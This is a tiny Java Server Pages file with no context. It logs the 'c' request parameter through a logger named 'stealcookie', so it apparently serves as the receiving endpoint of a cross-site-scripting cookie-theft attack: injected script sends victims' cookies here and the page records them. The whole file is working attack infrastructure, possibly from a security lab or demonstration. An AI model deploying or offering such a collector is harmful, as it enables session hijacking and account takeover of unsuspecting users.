<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ page import="org.slf4j.*"%>
<%
Logger logger = LoggerFactory.getLogger("stealcookie");
logger.info(request.getParameter("c"));
%>